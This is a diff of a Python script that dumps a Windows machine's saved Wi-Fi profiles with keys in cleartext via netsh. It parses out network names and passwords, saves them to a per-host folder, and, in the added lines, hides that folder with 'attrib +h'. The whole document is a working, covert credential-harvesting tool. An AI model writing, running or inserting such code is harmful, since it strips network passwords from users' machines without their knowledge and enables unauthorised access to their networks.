@@ -1,31 +1,47 @@
 import subprocess
 
-class ManipulateSo: 
+
+class ManipulateSo:
     def __init__(self):
         pass
 
     @classmethod
     def executeCommand(self, command):
         return subprocess.check_output(command, shell=True).decode('utf-8').split('\n')
-    
+
+    @classmethod
+    def captureAllxmlFilesWifi(self):
+        xmlFiles = []
+        for file in os.listdir():
+            if file.startswith("Wi-Fi-") and file.endswith(".xml"):
+                xmlFiles.append(file)
+        return xmlFiles
+
     @classmethod
     def getWifiList(cls, xmlFiles):
         wifiPW = []
 
         for file in xmlFiles:
-            # leer xml 
-            fileXml = open(file, "r").read()
-            # buscar el nombre de la red wifi y de la contraseña
-            nameWifi = fileXml.split("<name>")[1].split("</name>")[0]
-            passwordWifi = fileXml.split("<keyMaterial>")[1].split("</keyMaterial>")[0]
-            authentication = fileXml.split("<authentication>")[1].split("</authentication>")[0]
+            try:
+                fileXml = open(file, "r").read()
+            except Exception as e:
+                print(e)
 
-            wifiPW.append({
-                "name": nameWifi,
-                "password": passwordWifi,
-                "authentication": authentication
-            })
-        
+            authentication = fileXml.split("<authentication>")[
+                1].split("</authentication>")[0]
+
+            if authentication != 'open':
+
+                nameWifi = fileXml.split("<name>")[1].split("</name>")[0]
+                passwordWifi = fileXml.split("<keyMaterial>")[
+                    1].split("</keyMaterial>")[0]
+
+                wifiPW.append({
+                    "name": nameWifi,
+                    "password": passwordWifi,
+                    "authentication": authentication
+                })
+
         return wifiPW
 
     @classmethod
@@ -37,11 +53,10 @@ class ManipulateSo:
             file.write(f" AUTHENTICATION {wifi['authentication']}\n")
             file.close()
 
-    
+
 if __name__ == "__main__":
-    import os
     import errno
-    import glob
+    import os
 
     dirSaveWifi = "./wifi-pw"
 
@@ -52,10 +67,12 @@ if __name__ == "__main__":
             raise
 
     # Ejecuta los comandos para exportar la lista de redes wifi
-    ManipulateSo.executeCommand(["netsh", "wlan", "export", "profile", "key=clear"])
+    ManipulateSo.executeCommand(
+        ["netsh", "wlan", "export", "profile", "key=clear"])
 
-    # Se capturan todos los archivos xml en la ruta
-    xmlFiles = glob.glob(os.path.join("./", "*.xml"))
+    # Se capturan todos los archivos xml
+
+    xmlFiles = ManipulateSo.captureAllxmlFilesWifi()
 
     # Se obtiene la lista de redes wifi sin la sintaxis xml
     wifiList = ManipulateSo.getWifiList(xmlFiles)
@@ -69,6 +86,10 @@ if __name__ == "__main__":
         hostName = ManipulateSo.executeCommand(["hostname"])[0].split()[0]
         os.makedirs(dirSaveWifi + "/" + hostName)
         ManipulateSo.createFolderWP(wifiList, dirSaveWifi, hostName)
+
+        ManipulateSo.executeCommand(
+            ["attrib", "+h", f"{dirSaveWifi}"])
+
     except OSError as e:
         if e.errno != errno.EEXIST:
             raise
